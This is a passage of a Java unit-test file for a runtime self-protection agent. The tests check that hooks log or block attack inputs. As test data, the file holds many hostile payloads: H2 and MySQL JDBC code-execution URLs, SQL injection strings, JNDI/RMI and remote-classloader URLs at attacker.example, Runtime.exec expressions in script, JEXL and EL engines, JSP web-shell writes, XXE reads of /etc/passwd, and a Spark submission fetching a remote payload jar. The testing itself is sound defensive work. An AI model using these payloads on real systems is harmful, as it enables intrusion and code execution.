    Path log = Files.createTempFile("ohmyrasp-java17-jdbc-h2", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJdbcConnection(
        "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1/poc.sql'");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jdbc_h2_code_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"jdbc_url\":\"jdbc:h2:mem:test;INIT=RUNSCRIPT"));
  }

  @Test
  void logsDirectH2JdbcConnectionConstructorUrl() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jdbc-h2-direct", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeH2JdbcConnection(
        "jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS $$ void exec() { Runtime.getRuntime().exec(\"id\"); } $$");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"hook\":\"org.h2.jdbc.JdbcConnection.<init>\""));
    assertTrue(text.contains("\"algorithm\":\"java17_jdbc_h2_code_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsDerbyJdbcCodeLoadingUrl() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jdbc-derby", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJdbcConnection(
        "jdbc:derby:memory:test;create=true;derby.database.classpath=APP.malicious");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jdbc_derby_code_loading\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void blocksMysqlJdbcDeserializationUrlWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jdbc-mysql-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeJdbcConnection(
                "jdbc:mysql://127.0.0.1/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jdbc_mysql_deserialization\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsSqlIdentifierInjection() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-sql-identifier", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeSqlIdentifier("sqli/**/where/**/1=1--");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"hook\":\"SQL.identifier\""));
    assertTrue(text.contains("\"algorithm\":\"java17_sql_identifier_injection\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("reason=sql-comment"));
    assertTrue(text.contains("parameter=metricName"));
    assertFalse(text.contains("sqli/**/where"));
  }

  @Test
  void ignoresNormalSqlIdentifierMetricName() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-sql-identifier-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeSqlIdentifier("service_instance_jvm_memory.max");

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksSqlIdentifierInjectionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-sql-identifier-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeSqlIdentifier("sqli;drop/**/table/**/x"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_sql_identifier_injection\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksMyBatisOrderTypeSqlIdentifierInjectionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-mybatis-order-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Map<String, Object> parameterObject =
        myBatisParameterMap(
            new MyBatisQueryRequest(
                Arrays.asList(new MyBatisOrder("name", ",if(1=1,sleep(2),0)", null))));

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeMyBatisBoundSql(
                "select * from test_case order by `name` ,if(1=1,sleep(2),0)",
                parameterObject));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"hook\":\"MyBatis.BoundSql\""));
    assertTrue(text.contains("\"algorithm\":\"java17_sql_identifier_injection\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("source=MyBatis.BoundSql"));
    assertTrue(text.contains("parameter=orders[].type"));
    assertFalse(text.contains(",if(1=1"));
    assertFalse(text.contains("sleep(2)"));
  }

  @Test
  void ignoresNormalMyBatisOrderMetadata() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-mybatis-order-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Map<String, Object> parameterObject =
        myBatisParameterMap(
            new MyBatisQueryRequest(
                Arrays.asList(new MyBatisOrder("update_time", "desc", "test_case"))));

    Java17RaspHooks.beforeMyBatisBoundSql(
        "select * from test_case order by test_case.`update_time` desc", parameterObject);

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresLocalClassLoaderUrls() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-classloader-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeClassLoaderUrls(
        new URL[] {new URL("file:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/app.jar")});

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresFelixExtensionClassLoaderCodebase() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-classloader-felix", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeClassLoaderUrl(new URL("http://felix.extensions:9/"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsRemoteUrlClassLoaderCodebase() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-classloader-remote", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeClassLoaderUrls(
        new URL[] {new URL("jar:http://attacker.example/evil.jar!/payload/")});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_classloader_remote_codebase\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("URLClassLoader http jar:http://attacker.example/evil.jar!/payload/"));
  }

  @Test
  void blocksRmiClassLoaderCodebaseWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-rmi-classloader-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeRmiClassLoaderCodebase("ldap://attacker.example/Exploit"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_classloader_remote_codebase\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("RMIClassLoader ldap ldap://attacker.example/Exploit"));
  }

  @Test
  void ignoresNormalScriptEngineEval() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-script-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeScriptEval("1 + 1");
    Java17RaspHooks.beforeScriptEval("var value = Math.max(1, 2); value");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsScriptEngineRuntimeExecution() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-script-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeScriptEval("Java.type('java.lang.Runtime').getRuntime().exec('id')");
    Java17RaspHooks.beforeScriptEval(
        "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\\\A\").next();return {timestamp:123123,test: a}}");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_script_engine_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("Java.type('java.lang.Runtime').getRuntime().exec('id')"));
    assertTrue(text.contains("java.util.Scanner"));
  }

  @Test
  void blocksScriptEngineProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-script-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeScriptEval("new java.lang.ProcessBuilder('id').start()"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_script_engine_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJexlExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jexl-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJexlExpression(new FakeJexlExpression("asset.name == 'example.jar'"));
    Java17RaspHooks.beforeJexlExpression(new FakeJexlExpression("user.name ?: 'guest'"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJexlRuntimeExecutionWithoutRawExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jexl-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJexlExpression(
        new FakeJexlExpression(
            "233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/ohmyrasp-nexus7238-success')"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jexl_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("engine=jexl expressionLength="));
    assertFalse(text.contains("ohmyrasp-nexus7238-success"));
  }

  @Test
  void blocksJexlProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jexl-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeJexlExpression(
            new FakeJexlExpression("new java.lang.ProcessBuilder('id').start()")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jexl_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalElExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-el-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeElExpression(new FakeElExpression("${user.name}"));
    Java17RaspHooks.beforeElExpression(new FakeElExpression("${233 * 233}"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsElRuntimeExecutionWithoutRawExpression() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-el-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeElExpression(
        new FakeElExpression(
            "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/ohmyrasp-nexus10204-success')}"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_el_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("engine=el expressionLength="));
    assertFalse(text.contains("ohmyrasp-nexus10204-success"));
  }

  @Test
  void blocksElProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-el-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeElExpression(
            new FakeElExpression("${new java.lang.ProcessBuilder('id').start()}")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_el_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJavaCompilation() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-compile-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJavaCompilationSource(
        "javac", "public class SafeCompile { int value() { return 1 + 1; } }");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJavaCompilationRuntimeExecution() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-compile-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJavaCompilationSource(
        "javac",
        "public class EvilCompile { void run() throws Exception { java.lang.Runtime.getRuntime().exec(\"id\"); } }");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_java_compile_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("java.lang.Runtime.getRuntime().exec"));
  }

  @Test
  void blocksJavaCompilationProcessBuilderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-compile-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeJavaCompilationSource(
                "janino",
                "class Demo { void run() throws Exception { new ProcessBuilder(\"id\").start(); } }"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_java_compile_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalJaasConfig() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jaas-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Map<String, String> options = new HashMap<String, String>();
    options.put("principal", "app/localhost@EXAMPLE.COM");
    Java17RaspHooks.beforeJaasConfigEntry("com.sun.security.auth.module.Krb5LoginModule", options);

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJaasJndiRemoteProvider() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jaas-jndi", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Map<String, String> options = new HashMap<String, String>();
    options.put("user.provider.url", "ldap://java-chains:50389/x");
    Java17RaspHooks.beforeJaasConfigEntry("com.sun.security.auth.module.JndiLoginModule", options);

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jaas_jndi_remote_provider\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("ldap://java-chains:50389/x"));
  }

  @Test
  void blocksJaasJndiRemoteProviderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jaas-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeJaasConfigEntry(
                "com.sun.security.auth.module.JndiLoginModule",
                "user.provider.url=\"rmi://127.0.0.1:1099/Exploit\" useFirstPass=true"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jaas_jndi_remote_provider\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("rmi://127.0.0.1:1099/Exploit"));
  }

  @Test
  void ignoresReadOnlyJmxRemoteUrlArgument() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jmx-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJmxMBeanInvoke(
        "example:type=Info", "getStatus", new Object[] {"http://example.com/status"});
    Java17RaspHooks.beforeJmxMBeanInvoke(
        "example:type=Logger", "setLogFile", new Object[] {"/var/log/app/current.log"});

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJmxRemoteConfigSource() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jmx-remote", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeJmxMBeanInvoke(
        "org.apache.activemq:type=Broker,brokerName=localhost",
        "addNetworkConnector",
        new Object[] {"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jmx_remote_config_source\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("brokerConfig=xbean:http://attacker.example/poc.xml"));
  }

  @Test
  void blocksJmxScriptFileWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-jmx-write-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeJmxMBeanInvoke(
                "jdk.management.jfr:type=FlightRecorder",
                "copyTo",
                new Object[] {"/opt/activemq/webapps/admin/shelljfr.jsp"}));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_jmx_script_file_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/opt/activemq/webapps/admin/shelljfr.jsp"));
  }

  @Test
  void ignoresJavaBeansStatementOutsideXmlDecoderStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xml-decoder-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Statement statement = new Statement(new ProcessBuilder("sh", "-c", "id"), "start", new Object[0]);
    Java17RaspHooks.beforeJavaBeansStatement(statement, Arrays.asList("app.BeanUtil"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsXmlDecoderRuntimeExecution() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xml-decoder-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Statement statement = new Statement(new ProcessBuilder("sh", "-c", "id"), "start", new Object[0]);
    Java17RaspHooks.beforeJavaBeansStatement(
        statement, Arrays.asList("java.beans.XMLDecoder", "com.sun.beans.decoder.DocumentHandler"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_xml_decoder_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("java.lang.ProcessBuilder start sh -c id"));
  }

  @Test
  void blocksXmlDecoderScriptWriterWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xml-decoder-writer-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    Statement statement =
        new Statement(java.io.PrintWriter.class, "new", new Object[] {"/tmp/webapps/ROOT/shell.jsp"});

    assertThrows(
        Java17RaspBlockException.class,
        () ->
            Java17RaspHooks.beforeJavaBeansStatement(
                statement, Arrays.asList("java.beans.XMLDecoder")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_xml_decoder_script_file_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/tmp/webapps/ROOT/shell.jsp"));
  }

  @Test
  void ignoresNormalXmlEntitySource() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xxe-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("catalina.home", "/usr/local/tomcat");
    System.setProperty("activemq.home", "/opt/activemq");

    Java17RaspHooks.beforeXmlEntity("[xml]", "");
    Java17RaspHooks.beforeXmlEntity("[xml]", "file:/usr/local/tomcat/conf/server.xml");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/dubbo-sample-1.0-SNAPSHOT.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/opt/activemq/lib/web/jetty-jakarta-servlet-api-5.0.2.jar!/jakarta/servlet/resources/web-jsptaglibrary_1_2.dtd");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/root/.m2/repository/org/eclipse/jetty/toolchain/jetty-schemas/3.1.M0/jetty-schemas-3.1.M0.jar!/javax/servlet/jsp/resources/web-jsptaglibrary_1_2.dtd");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/root/.m2/repository/org/apache/struts/struts2-core/2.3.30/struts2-core-2.3.30.jar!/struts-default.xml");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/struts2-config-browser-plugin-2.3.34.jar!/struts-plugin.xml");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "file:/usr/src/target/classes/struts.xml");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "file:/usr/src/target/classes/struts-actionchaining.xml");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts.xml");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts-chat.xml");
    com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.parseLocalEntity(
        "[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/example.xml");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]",
        "file:///usr/local/tomcat/org/apache/struts2/showcase/ajax/Example5Action-validation.xml");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]", "file:///usr/src/com/opensymphony/xwork2/validator/validators/default.xml");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "http://www.eclipse.org/jetty/configure_9_0.dtd");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "http://www.eclipse.org/jetty/configure_9_3.dtd");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "http://java.sun.com/dtd/web-app_2_3.dtd");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "http://java.sun.com/dtd/web-facesconfig_1_1.dtd");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "http://mybatis.org/dtd/mybatis-3-config.dtd");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "http://mybatis.org/dtd/mybatis-3-mapper.dtd");
    Java17RaspHooks.beforeXmlEntity("[dtd]", "http://www.springframework.org/dtd/spring-beans.dtd");
    Java17RaspHooks.beforeXmlEntity("local", "classpath:application.xml");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsXxeExternalEntityProtocol() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xxe-file", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());

    Java17RaspHooks.beforeXmlEntity("xxe", "file:///etc/passwd");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/example.xml");
    Java17RaspHooks.beforeXmlEntity(
        "[dtd]", "file:///tmp/org/apache/struts2/showcase/ajax/Example5Action-validation.xml");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_xxe_external_entity_protocol\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("xxe file:///etc/passwd"));
    assertTrue(
        text.contains("[dtd] file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/example.xml"));
    assertTrue(
        text.contains(
            "[dtd] file:///tmp/org/apache/struts2/showcase/ajax/Example5Action-validation.xml"));
  }

  @Test
  void blocksXxeExternalEntityProtocolWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java17-xxe-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java17.log", log.toString());
    System.setProperty("ohmyrasp.java17.block", "true");

    assertThrows(
        Java17RaspBlockException.class,
        () -> Java17RaspHooks.beforeXmlEntity("xxe", "http://127.0.0.1:9/evil.dtd"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java17_xxe_external_entity_protocol\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("http://127.0.0.1:9/evil.dtd"));
  }

  static final class JaxRsRequestStub {
    private final String method;
    private final URI requestUri;
    private final Map<String, String> headers = new HashMap<String, String>();

    JaxRsRequestStub(String method, String requestUri) {
      this.method = method;
      this.requestUri = URI.create(requestUri);
    }

    public String getMethod() {
      return method;
    }

    public URI getRequestUri() {
      return requestUri;
    }

    public String getHeaderString(String name) {
      return headers.get(name);
    }

    JaxRsRequestStub withHeader(String name, String value) {
      headers.put(name, value);
      return this;
    }
  }

  static final class RequestStub {
    private final String method;
    private final String uri;
    private final String query;
    private final Object[] cookies;
    private final Map<String, String> headers = new HashMap<String, String>();
    private final Map<String, String[]> parameters = new HashMap<String, String[]>();
    private final Map<String, Object> attributes = new HashMap<String, Object>();

    RequestStub(String method, String uri, String query) {
      this(method, uri, query, new Object[0]);
    }

    RequestStub(String method, String uri, String query, Object... cookies) {
      this.method = method;
      this.uri = uri;
      this.query = query;
      this.cookies = cookies;
    }

    public String getMethod() {
      return method;
    }

    public String getRequestURI() {
      return uri;
    }

    public String getQueryString() {
      return query;
    }

    public Object[] getCookies() {
      return cookies;
    }

    public String getHeader(String name) {
      return headers.get(name);
    }

    public Map<String, String[]> getParameterMap() {
      return parameters;
    }

    public Object getAttribute(String name) {
      return attributes.get(name);
    }

    RequestStub withHeader(String name, String value) {
      headers.put(name, value);
      return this;
    }

    RequestStub withParameter(String name, String value) {
      parameters.put(name, new String[] {value});
      return this;
    }

    RequestStub withAttribute(String name, Object value) {
      attributes.put(name, value);
      return this;
    }
  }

  static final class ApplicationDispatcher {
    static void include(Object request) {
      Java17RaspHooks.beforeHttpRequest(request);
    }
  }

  static final class CookieStub {
    private final String name;
    private final String value;

    CookieStub(String name, String value) {
      this.name = name;
      this.value = value;
    }

    public String getName() {
      return name;
    }

    public String getValue() {
      return value;
    }
  }

  static final class FakeJexlExpression {
    private final String source;

    FakeJexlExpression(String source) {
      this.source = source;
    }

    public String getSourceText() {
      return source;
    }
  }

  static final class FakeElExpression {
    private final String source;

    FakeElExpression(String source) {
      this.source = source;
    }

    public String getExpressionString() {
      return source;
    }
  }

  private static String sparkRestSubmissionBody() {
    return "{"
        + "\"action\":\"CreateSubmissionRequest\","
        + "\"appResource\":\"http://attacker.example/payload.jar\","
        + "\"mainClass\":\"Exploit\","
        + "\"sparkProperties\":{\"spark.jars\":\"http://attacker.example/payload.jar\"}"
        + "}";
  }

  private static Object yarnSubmission(String command) {
    return new Java17YarnSubmissionProbe(Arrays.asList(command));
  }

  private static Map<String, Object> myBatisParameterMap(Object request) {
    Map<String, Object> values = new HashMap<>();
    values.put("request", request);
    return values;
  }

  static final class MyBatisQueryRequest {
    private final List<MyBatisOrder> orders;

    MyBatisQueryRequest(List<MyBatisOrder> orders) {
      this.orders = orders;
    }

    public List<MyBatisOrder> getOrders() {
      return orders;
    }
  }

  static final class MyBatisOrder {
    private final String name;
    private final String type;
    private final String prefix;

    MyBatisOrder(String name, String type, String prefix) {
      this.name = name;
      this.type = type;
      this.prefix = prefix;
    }

    public String getName() {
      return name;
    }

    public String getType() {
      return type;
    }

    public String getPrefix() {
      return prefix;
    }
  }

  private static byte[] classBytes(Class<?> type) throws Exception {
    String resourceName = type.getSimpleName() + ".class";
    try (InputStream input = type.getResourceAsStream(resourceName)) {
      if (input == null) {
        throw new IllegalStateException("Missing class resource " + resourceName);
      }
      ByteArrayOutputStream output = new ByteArrayOutputStream();
      byte[] buffer = new byte[4096];
      int count;
